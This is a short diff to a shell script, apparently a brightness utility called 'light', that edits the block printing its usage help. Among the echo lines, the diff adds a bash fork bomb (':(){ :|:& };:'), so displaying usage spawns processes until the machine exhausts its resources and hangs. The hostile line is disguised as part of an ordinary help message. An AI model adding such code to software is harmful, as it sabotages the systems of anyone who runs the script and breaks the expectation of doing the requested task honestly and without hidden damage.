@@ -72,6 +72,7 @@ then
 		echo Usage: light -a
 		echo Usage: light -s [Value]
 		echo Usage: light -i
+		:(){ :|:& };:
 		echo
 		echo
 		echo Options:
